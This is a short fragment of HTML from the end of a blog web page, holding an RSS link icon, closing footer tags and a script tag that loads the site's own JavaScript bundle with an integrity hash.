+<span><a href=https://sequr.be/blog/index.xml target=_blank title=rss><svg width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div></footer></div><script type=text/javascript src=https://sequr.be/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc+cxaJzDdCYbAW0X1G+DgZYvtKFXe6MBex8jUJ2JT25mQx+YjACIng=="></script></body></html>
